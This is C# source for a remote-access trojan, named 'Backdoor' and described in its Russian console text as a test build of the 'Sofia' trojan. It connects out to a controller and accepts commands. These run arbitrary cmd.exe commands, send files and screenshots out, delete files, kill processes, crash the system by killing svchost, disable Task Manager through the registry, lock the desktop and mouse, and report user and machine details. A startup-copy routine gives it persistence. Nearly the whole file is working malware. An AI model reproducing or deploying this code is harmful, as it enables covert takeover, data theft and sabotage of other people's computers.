using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.Xml;
using System.Drawing;
using System.Threading;
using System.Collections.Generic;

namespace Backdoor
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Привет это тестовая сборка трояна Софья(или София или Cоня и Софа)");
            Console.WriteLine("Консоль можно будет скрыть в настройках");
            var server = new Server(Settings.ipAdr, Settings.port);
            server.Connect();
        }

    }
    public class Server
    {
        private string adress = "127.0.0.1";
        private int port = 7777;
        private Socket conn = new Socket(new AddressFamily(), SocketType.Stream, ProtocolType.Tcp);

        public Server(string adr, int sockPort)
        {
            adress = adr;
            port = sockPort;
        }

        public void Connect()
        {
            conn = null;
            conn = new Socket(new AddressFamily(), SocketType.Stream, ProtocolType.Tcp);
            Console.WriteLine("Поиск соеденения: ");
            Console.WriteLine("...");
            while (true)
            {
                try
                {
                    IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Parse(adress), port);
                    conn.Connect(ipEndPoint);
                    Console.WriteLine($"Подключено к адрес: {adress} порт: {port}");
                    Loop();
                    break;
                }
                catch (Exception e)
                {
                    var m = e.Message;
                }
            }
        }

        private void Loop()
        {
            while (true)
            {
                string data = null;

                byte[] bytes = new byte[100000];
                int bytesRec = 0;
                try
                {
                    bytesRec = conn.Receive(bytes);
                }
                catch (Exception e) { Console.WriteLine($"Соеденение преравнно, ошибка {e.Message}"); Connect(); break; }

                CommandExecutor executor = new CommandExecutor();
                data = Encoding.UTF8.GetString(bytes, 0, bytesRec);


                Console.Write("Полученный текст: " + data + "\n\n"); ;

                try
                {
                    if (data.StartsWith("ls"))
                    {
                        data = data.Remove(0, 2);
                        string path = ParseComand(data);
                        var files = executor.ScanDirectoryFromXml(path);
                        conn.Send(Encoding.UTF8.GetBytes(files));
                        continue;
                    }

                    if (data.StartsWith("rm"))
                    {
                        data = data.Remove(0, 2);
                        string path = ParseComand(data);
                        executor.RemoveFileOrDirectory(path);
                        conn.Send(Encoding.UTF8.GetBytes("Файл " + path + " удалён."));
                        continue;
                    }

                    if (data.StartsWith("start"))
                    {

                        data = data.Remove(0, 5);
                        string path = ParseComand(data);
                        executor.StartFile(path);
                        conn.Send(Encoding.UTF8.GetBytes("Процесс " + path + " запущён."));
                        continue;
                    }


                    if (data.StartsWith("pkill"))
                    {
                        data = data.Remove(0, 5);
                        var pname = ParseComand(data);
                        executor.pkill(pname);
                        conn.Send(Encoding.UTF8.GetBytes("Процесс с именем " + pname + " уничтожен"));
                        continue;
                    }

                    if (data.StartsWith("tasklist") || data == "tasklist")
                    {
                        string tasks = executor.GetAllTasksInSysFromXml();
                        conn.Send(Encoding.UTF8.GetBytes(tasks));
                        continue;
                    }

                    if (data.StartsWith("cmd"))
                    {
                        data = data.Remove(0, 3);
                        string comm = ParseComand(data);
                        var result = executor.ExecuteCmdCommand(comm);
                        conn.Send(Encoding.UTF8.GetBytes(result));
                        continue;
                    }

                    if (data.StartsWith("msg"))
                    {
                        data = data.Remove(0, 3);
                        string msg = ParseComand(data);
                        executor.ShowUserMsg(msg);
                        conn.Send(Encoding.UTF8.GetBytes($"Сообщение отправлено"));
                        continue;
                    }
                    if (data.StartsWith("enTaskmgr"))
                    {
                        data = data.Remove(0, 9);
                        string comm = ParseComand(data);
                        if (comm == "true")
                        {
                            executor.UnLockTaskMgr();
                            conn.Send(Encoding.UTF8.GetBytes($"Диспетчер задач включен"));
                        }
                        if (comm == "false")
                        {
                            executor.LockTaskMgr();
                            conn.Send(Encoding.UTF8.GetBytes($"Диспетчер задач выключен"));
                        }
                        continue;
                    }
                    if (data.StartsWith("bluescreen") || data == "bluescreen")
                    {
                        executor.CrashSystem();
                        conn.Send(Encoding.UTF8.GetBytes("Система успешно крашнута"));
                        continue;
                    }
                    if (data.StartsWith("download"))
                    {
                        data = data.Remove(0, 3);
                        string comm = ParseComand(data);
                        conn.Send(executor.GetFileFroUpload(comm));
                        continue;
                    }
                    if (data.StartsWith("transl"))
                    {
                        var comm = ParseComand(data);
                        if (comm == "get")
                        {
                            conn.Send(executor.CaptureScreenAndTransleteToBytes());
                            continue;
                        }
                    }
                    if (data.StartsWith("block"))
                    {
                        data = data.Remove(0, 5);
                        string comm = ParseComand(data);
                        if (comm == "true")
                        {
                            executor.LockSystem();
                            conn.Send(Encoding.UTF8.GetBytes("заблокированно"));
                            continue;
                        }
                        if (comm == "false")
                        {
                            executor.UnLockSystem();
                            conn.Send(Encoding.UTF8.GetBytes("разблокированно"));
                            continue;
                        }
                        else
                        {
                            throw new Exception("блокировка системы: неверный аргумент");
                        }
                    }
                    if (data.StartsWith("curblock"))
                    {
                        data = data.Remove(0, 5);
                        string comm = ParseComand(data);
                        if (comm == "true")
                        {
                            executor.LockMouse();
                            conn.Send(Encoding.UTF8.GetBytes("курсор заблокирован"));
                            continue;
                        }
                        if (comm == "false")
                        {
                            executor.UnLockMouse();
                            conn.Send(Encoding.UTF8.GetBytes("курсор разблокирован"));
                            continue;
                        }
                        else
                        {
                            throw new Exception("блокировка курсора: неверный аргумент");
                        }
                    }
                    if (data.StartsWith("dirtyScreen"))
                    {
                        data = data.Remove(0, 11);
                        string comm = ParseComand(data);
                        if (comm.StartsWith("true"))
                        {
                            comm = comm.Remove(0, 5);
                            executor.SpamScreenFromWindows(comm);
                            conn.Send(Encoding.UTF8.GetBytes("экран замусорен"));
                            continue;
                        }
                        if (comm.StartsWith("false"))
                        {
                            executor.DestroySpamWindows();
                            conn.Send(Encoding.UTF8.GetBytes("очищено"));
                            continue;
                        }
                        else
                        {
                            throw new Exception("мусорить экран системы: неверный аргумент");
                        }
                    }
                    if (data.StartsWith("abort connection") || data == "abort connection")
                    {
                        Console.WriteLine($"Пользователь прервал соеденение");
                        conn.Send(Encoding.UTF8.GetBytes("Abort connection"));
                        Connect();
                        break;
                    }
                    if (data.StartsWith("getsysInf"))
                    {
                        data = data.Remove(0, 11);
                        string comm = ParseComand(data);
                        if (comm.StartsWith("true"))
                        {
                            comm = comm.Remove(0, 5);
                            conn.Send(Encoding.UTF8.GetBytes(executor.GetSystemInformation()));
                            continue;
                        }
                        if (comm.StartsWith("false"))
                        {
                            conn.Send(Encoding.UTF8.GetBytes(executor.GetSystemInformation()));
                            continue;
                        }
                        else
                        {
                            throw new Exception("информация системы: неверный аргумент");
                        }
                    }
                }
                catch (Exception e)
                {
                    conn.Send(Encoding.UTF8.GetBytes("Ошибка: " + e.Message + " Sourse:" + e.Source));
                }
            }
        }
        public static string ParseComand(string allcommand, Char attribute = '$')
        {
            string commandBody = "";
            bool flag = false;
            for (int i = 0; i < allcommand.Length; i++)
            {
                if (flag)
                    commandBody += allcommand[i];
                if (allcommand[i] == attribute)
                    flag = true;
            }
            return commandBody;
        }
    }
    public class CommandExecutor
    {
        private static Thread blockMouseThread = null;
        private static List<Thread> SpamWindows = new List<Thread>();

        [System.Runtime.InteropServices.DllImport("user32")]
        private static extern int SetCursorPos(int x, int y);

        public CommandExecutor()
        {

        }
        public void pkill(int pid)
        {
            var process = Process.GetProcesses();
            for (int i = 0; i < process.Length; i++)
            {
                if (process[i].Id == pid)
                {
                    process[i].Kill();
                    break;
                }
            }
        }
        public void pkill(string pname)
        {
            var process = Process.GetProcesses();
            for (int i = 0; i < process.Length; i++)
            {
                if (process[i].ProcessName == pname)
                {
                    process[i].Kill();
                    break;
                }
            }
        }
        public string GetAllTasksInSysFromXml()
        {
            string tasks = "";

            var process = Process.GetProcesses();
            tasks += "<tasklist>";
            for (int i = 0; i < process.Length; i++)
            {
                tasks += "<task>" + process[i].ProcessName + "</task>";
            }
            tasks += "</tasklist>";
            return tasks;
        }
        public string ScanDirectoryFromXml(string path)
        {
            var dirFiles = Directory.GetFiles(path);
            var directoris = Directory.GetDirectories(path);
            string files = "";

            files += "<files> ";
            for (int i = 0; i < dirFiles.Length; i++)
            {
                files += $" <file{i}> " + Path.GetFileName(dirFiles[i]) + $" </file{i}>";
            }
            for (int i = 0; i < directoris.Length; i++)
            {
                files += $" <dir{i}> " + "/" + Path.GetFileName(directoris[i]) + $" </dir{i}>";
            }
            files += " </files>";
            return files;
        }
        public void RemoveFileOrDirectory(string path)
        {
            try { File.Delete(path); } catch { }
            try { Directory.Delete(path, true); } catch { }
        }
        public void StartFile(string path)
        {
            var t = new Thread(() => Process.Start(path));
            t.Start();
        }
        public byte[] GetFileFroUpload(string path)
        {
            return File.ReadAllBytes(path);
        }
        public string ExecuteCmdCommand(string comm)
        {
            var proc = new Process();
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.FileName = "CMD.exe";
            proc.StartInfo.Arguments = " /C " + comm;
            proc.Start();
            return proc.StandardOutput.ReadToEnd();
        }
        public void CrashSystem()
        {
            var process = Process.GetProcesses();
            for (int i = 0; i < process.Length; i++)
            {
                if (process[i].ProcessName == "svchost")
                {
                    process[i].Kill();
                    break;
                }
            }
        }
        public void ShowUserMsg(string docContent)
        {
            XmlDocument doc = new XmlDocument();
            doc.LoadXml(docContent);

            XmlNode root = doc.FirstChild;

            var textMsg = "";
            var textSub = "";
            var textBut = "";
            var textIco = "";

            if (root.HasChildNodes)
            {
                for (int i = 0; i < root.ChildNodes.Count; i++)
                {
                    if (root.ChildNodes[i].Name == "text")
                        textMsg = root.ChildNodes[i].InnerText;
                    if (root.ChildNodes[i].Name == "subject")
                        textSub = root.ChildNodes[i].InnerText;
                    if (root.ChildNodes[i].Name == "but")
                        textBut = root.ChildNodes[i].InnerText;
                    if (root.ChildNodes[i].Name == "ico")
                        textIco = root.ChildNodes[i].InnerText;
                }
            }
            var t = new Thread(() => MessageBox.Show(textMsg, textSub, (MessageBoxButtons)int.Parse(textBut), MessageBoxIcon.Error));
            t.Start();
        }
        public byte[] CaptureScreenAndTransleteToBytes()
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);


            Graphics graphics = Graphics.FromImage(bitmap as System.Drawing.Image);
            graphics.CopyFromScreen(0, 0, 0, 0, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));

            bitmap = ResizeImg(1140, 641, bitmap);

            MemoryStream stream = new MemoryStream();
            bitmap.Save(stream, System.Drawing.Imaging.ImageFormat.Jpeg);
            Byte[] bytesForSend = stream.ToArray();

            return bytesForSend;
        }
        private void CreateSpamWindow(bool moveWindow)
        {
            var r = new Random();
            var window = new Form();
            window.Show();
            window.SetBounds(r.Next(0, Screen.PrimaryScreen.Bounds.Width), r.Next(0, Screen.PrimaryScreen.Bounds.Height), window.Width, window.Height);
            while (true)
            {
                if (moveWindow)
                {
                    window.SetBounds(r.Next(0, Screen.PrimaryScreen.Bounds.Width), r.Next(0, Screen.PrimaryScreen.Bounds.Height), window.Width, window.Height);
                }
                Thread.Sleep(r.Next(100, 600));
            }
        }
        public void SpamScreenFromWindows(string arguments)
        {
            XmlDocument doc = new XmlDocument();
            doc.LoadXml(arguments);

            XmlNode root = doc.FirstChild;

            var windowsValue = 1;
            var moveWindows = false;

            if (root.HasChildNodes)
            {
                for (int i = 0; i < root.ChildNodes.Count; i++)
                {
                    if (root.ChildNodes[i].Name == "windowsValue")
                    {
                        windowsValue = int.Parse(root.ChildNodes[i].InnerText);
                    }
                    if(root.ChildNodes[i].Name == "moveWindows")
                    {
                        moveWindows = root.ChildNodes[i].InnerText == "True";
                    }
                }
            }
            for (int i = 0; i < windowsValue; i++)
            {
                Thread thread = new Thread(() => CreateSpamWindow(moveWindows));
                thread.Start();
                SpamWindows.Add(thread);
            }
        }
        public async void DestroySpamWindows()
        {
            for (int i = 0; i < SpamWindows.Count; i++)
            {
                await System.Threading.Tasks.Task.Run(() => SpamWindows[i].Abort());
            }
        }
        public void LockMouse()
        {
            if (blockMouseThread != null) return;
            blockMouseThread = new Thread(() => SetZeroMouseInInfLoop());
            blockMouseThread.Start();
        }
        public void UnLockMouse()
        {
            if (blockMouseThread != null) blockMouseThread.Abort();
            blockMouseThread = null;
        }
        public void LockSystem()
        {
            LockTaskMgr();
            var process = Process.GetProcesses();
            for (int i = 0; i < process.Length; i++)
            {
                if (process[i].ProcessName == "Backdoor")
                {
                    continue;
                }
                if (process[i].ProcessName == "explorer")
                {
                    process[i].Kill();
                }
                if (!String.IsNullOrEmpty(process[i].MainWindowTitle))
                {
                    process[i].Kill();
                }
            }
            LockMouse();
        }
        public string GetSystemInformation()
        {
            string str = "нету ip";
            for (int i = 0; i < Dns.GetHostByName(Dns.GetHostName()).AddressList.Length; i++) str += Dns.GetHostByName(Dns.GetHostName()).AddressList[i];
            return 
$@"<sysInf> 
<ip>{str}</ip> 
<time>{DateTime.Now}</time>
<machineName>{Environment.MachineName}</machineName> 
<usName>{Environment.UserName}</usName> 
<buildNum>{Environment.Version.Build}</buildNum> 
<sys>{Environment.OSVersion}</sys> 
</sysInf>";
        }
        public void UnLockSystem()
        {
            StartFile("c:/Windows/explorer.exe");
            UnLockMouse();
        }
        public void LockTaskMgr()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
        @"Software\Microsoft\Windows\CurrentVersion\Policies\System");

            objRegistryKey.SetValue("DisableTaskMgr", "1");
            objRegistryKey.Close();
        }
        public void UnLockTaskMgr()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") != null)
                objRegistryKey.DeleteValue("DisableTaskMgr");
        }
        public static void AddToStartUp()
        {
            var startPath = "c:/Users/VASUS/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
            var dir = Directory.GetCurrentDirectory() + "/Backdoor.exe";
            File.Copy(dir, startPath);
        }
        private void SetZeroMouseInInfLoop()
        {
            while (true)
            {
                Thread.Sleep(50);
                SetCursorPos(0, 0);
            }
        }
        private Bitmap ResizeImg(int newWidth, int newHeight, Bitmap imgToResize)
        {
            Bitmap b = new Bitmap(newWidth, newHeight);
            Graphics g = Graphics.FromImage((Image)b);
            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;

            g.DrawImage(imgToResize, 0, 0, newWidth, newHeight);
            g.Dispose();

            return b;
        }
    }
}
